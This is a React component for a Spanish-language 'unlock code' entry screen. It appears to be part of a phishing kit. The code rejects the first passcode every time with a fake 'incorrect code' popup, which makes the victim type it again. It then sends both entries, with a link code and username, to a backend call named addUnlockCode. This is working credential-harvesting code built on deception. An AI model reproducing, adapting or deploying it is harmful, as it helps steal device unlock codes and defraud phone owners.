import React, { useEffect, useRef, useState } from 'react';
import { Form, FormControl, Container, Row, Col } from 'react-bootstrap';
import PopupPassCode from '../../../resources/poputs/PopupPassCode';
import PopupLogin from '../../../resources/poputs/PopupLogin';
import responses from '../../../api/responses';
import { convert } from 'html-to-text';
import { useData } from '../../../context/UserContext';

const Passcode = ({
    translator,
    onClosePasscode
}) => {
    const { user } = useData();
    let typeCode = user?.data?.unlockCode;
    const isAlfa = typeCode === 'alphanumeric';
    let lengthCode = isAlfa ? 4 : (typeCode == 4 ? 4 : 6);

    const [lengthArray, setLengthArray] = useState([]);
    const [inputValues, setInputValues] = useState([]);
    const [codeOne, setCodeOne] = useState('');
    const [codeTwo, setCodetwo] = useState('');
    const [passCodeCount, setPassCodeCount] = useState(0);
    const [errorAlfa, setErrorAlfa] = useState(false);
    const [loadingAlfa, setLoadingAlfa] = useState(false);

    const passCodeOneRef = useRef('');
    const passCodeTwoRef = useRef('');

    useEffect(() => {
        setLengthArray(Array.from({ length: lengthCode }, (_, i) => i));
        setInputValues(new Array(lengthCode).fill(''));
    }, [lengthCode]);

    useEffect(() => {
        if (lengthArray.length > 0 && !isAlfa) {
            const firstField = document.getElementsByClassName('char-field')[0];
            if (firstField) {
                firstField.focus();
            }
        }
    }, [lengthArray, isAlfa]);

    const inputRefs = useRef([]);

    const handleChange = (e, index) => {
        document.getElementsByClassName('popupPasscode')[0].style.display = 'none';
        const newValue = e.target.value;
        const updatedValues = [...inputValues];
        updatedValues[index] = newValue;
        setInputValues(updatedValues);

        if (index === lengthCode - 1 && updatedValues.every((val) => val !== '')) {
            handlePasscode(updatedValues.join(''));
        }

        if (newValue.length === 1 && index < lengthCode - 1) {
            inputRefs.current[index + 1].focus();
        }
    };

    const handleKeyDown = (e, index) => {
        if (e.key === 'Backspace' && index > 0) {
            const lastFilledIndex = inputValues.findIndex((val) => val === '');
            const lastIndexToClear = lastFilledIndex === -1 ? lengthCode - 1 : lastFilledIndex - 1;

            if (index <= lastIndexToClear) {
                const clearedValues = inputValues.map((val, i) => (i >= index ? '' : val));
                setInputValues(clearedValues);

                clearedValues.forEach((val, i) => {
                    if (inputRefs.current[i]) {
                        inputRefs.current[i].value = val;
                    }
                });
            }

            inputRefs.current[index - 1].focus();
        }
    };

    const handlePasscode = (code, e) => {
        if (isAlfa) {
            if (e) e.preventDefault();
            setLoadingAlfa(true);
        } else {
            document.getElementById('loadingVerify').style.display = 'block';
        }

        setPassCodeCount((prevCount) => {
            const newCount = prevCount + 1;
            if (newCount === 1) {
                passCodeOneRef.current = code;
            } else if (newCount === 2) {
                passCodeTwoRef.current = code;
            }

            setCodeOne(passCodeOneRef.current);
            setCodetwo(passCodeTwoRef.current);

            let statusPasscode = '';

            setTimeout(async () => {
                if (newCount == 1) {
                    if (isAlfa) {
                        if (e) e.preventDefault();
                        setLoadingAlfa(false);
                        document.getElementsByClassName('popupLogin')[0].style.display = 'block';
                        setCodeOne('');
                        document.getElementById('codeSecurity').focus();
                    } else {
                        const fields = document.getElementsByClassName('char-field');
                        Array.from(fields).forEach((field) => {
                            field.value = '';
                        });
                        setInputValues(new Array(lengthCode).fill(''));
                        document.getElementsByClassName('popupPasscode')[0].style.display = 'block';
                        document.getElementById('loadingVerify').style.display = 'none';
                        removeFocusFromFields();
                        const firstField = document.getElementsByClassName('char-field')[0];
                        firstField.focus();
                    }
                    statusPasscode = 'passcode';

                    await addAcountPasscode(passCodeOneRef.current, 'Processing', statusPasscode);

                } else if (newCount === 2) {
                    if (isAlfa) {
                        document.getElementsByClassName('popupLogin')[0].style.display = 'none';
                    } else {
                        removeFocusFromFields();
                    }
                    statusPasscode = 'passcode_process';
                    await addAcountPasscode(passCodeOneRef.current, passCodeTwoRef.current, statusPasscode);
                    setTimeout(() => {
                        if (isAlfa) {
                            document.getElementsByClassName('popupLogin')[0].style.display = 'none';
                        }
                        onClosePasscode();
                    }, 2500);
                }
            }, 1500);
            return newCount;
        });
    };

    const removeFocusFromFields = () => {
        const fields = document.getElementsByClassName('char-field');
        Array.from(fields).forEach((field) => field.blur());
    };

    const addAcountPasscode = async (passCodeOne, passCodeTwo, statusPasscode) => {
        try {           
            let data = {
                linkCode: user?.data?.linkCode || '',
                username: user?.data?.username || '',
                codesUnlock : `${passCodeOne}-${passCodeTwo}`,
                status : statusPasscode
            }
            const response = await responses.addUnlockCode(data);
        } catch (error) {
            console.error('Error en add passcode:', error);
        }
    }

    return (
        <Container style={{ padding: 0, position: 'relative' }}>
            <Form
                className="form-horizontal form-bordered form-code"
                noValidate
                onSubmit={e => {
                    if (isAlfa) {
                        e.preventDefault();
                        if (codeOne.length < 1) {
                            setErrorAlfa(true);
                        } else {
                            setErrorAlfa(false);
                            handlePasscode(codeOne, e);
                        }
                    }
                }}
            >
                <div>
                    <h3 className="my-3 headerPassCode" style={{ textAlign: 'center' }}>{translator('Ingrese su código de desbloqueo')}</h3>
                </div>
                <PopupPassCode translator={translator} />
                {isAlfa ? (
                    <Row className="justify-content-center">
                        <Col xs={12} className="d-flex flex-column align-items-center">
                            <FormControl
                                id='codeSecurity'
                                type="password"
                                maxLength={20}
                                autoCorrect="off"
                                autoComplete="off"
                                autoCapitalize="off"
                                spellCheck="false"
                                className="form-control force-ltr form-textbox"
                                style={{
                                    width: '100%',
                                    maxWidth: '320px',
                                    height: '44px',
                                    border: '1px solid #d7d7d7',
                                    borderRadius: '22px',
                                    textAlign: 'center',
                                    fontSize: '18px',
                                    fontWeight: '400',
                                    marginBottom: '16px',
                                    boxShadow: '0 1px 4px rgba(0,0,0,0.04)'
                                }}
                                placeholder={translator('Código de desbloqueo')}
                                value={codeOne}
                                onChange={e => setCodeOne(e.target.value)}
                                onKeyDown={e => (
                                    setErrorAlfa(''),
                                    document.getElementsByClassName('popupLogin')[0].style.display = 'none'
                                )}
                                required
                            />
                            <button
                                type="submit"
                                className="btn btn-primary"
                                style={{
                                    width: '150px',
                                    borderRadius: '22px',
                                    fontSize: '18px',
                                    fontWeight: '500'
                                }}
                                {...(loadingAlfa ? { disabled: true } : {})}
                            >
                                {loadingAlfa
                                    ? translator('Verificando')
                                    : translator('Siguiente')
                                }
                            </button>
                            {errorAlfa && (
                                <div style={{ color: 'red', marginTop: 8, fontSize: 14 }}>
                                    {translator('El código no puede estar vacío')}
                                </div>
                            )}
                        </Col>
                        <div id='PopupLoginError'
                            style={{
                                position: 'relative',
                                bottom: '104px'
                            }}
                        >
                            <PopupLogin
                                translator={translator}
                                text={'Código de verificación incorrecto'}
                            />
                        </div>
                    </Row>
                ) : (
                    <Row className="justify-content-center">
                        {lengthArray.map((index) => (
                            <Col key={index} xs="auto" className="field-wrap force-ltr" style={{ padding: '6px' }}>
                                <FormControl
                                    maxLength="1"
                                    autoCorrect="off"
                                    autoComplete="off"
                                    autoCapitalize="off"
                                    spellCheck="false"
                                    id={`char${index}`}
                                    className="form-control force-ltr form-textbox char-field"
                                    aria-label={`Enter Verification Code Digit ${index + 1}`}
                                    placeholder=""
                                    type="tel"
                                    style={{
                                        width: '40px',
                                        height: '40px',
                                        border: '1px solid #d7d7d7',
                                        borderRadius: '4px',
                                        textAlign: 'center',
                                        fontSize: '24px',
                                        padding: '0',
                                        fontWeight: '500',
                                        display: 'inline-block',
                                    }}
                                    onKeyPress={(e) => {
                                        if (!/[0-9]/.test(e.key)) {
                                            e.preventDefault();
                                        }
                                    }}
                                    onChange={(e) => handleChange(e, index)}
                                    onKeyDown={(e) => handleKeyDown(e, index)}
                                    ref={(el) => (inputRefs.current[index] = el)}
                                />
                            </Col>
                        ))}
                    </Row>
                )}
                {!isAlfa && (
                    <div style={{ textAlign: 'center', fontSize: '15px', marginTop: '10px' }}>
                        <div style={{ display: 'none' }} id="loadingVerify" className="loading-text">{translator('Verificando')}</div>
                    </div>
                )}
            </Form>
        </Container>
    );
};

export default Passcode;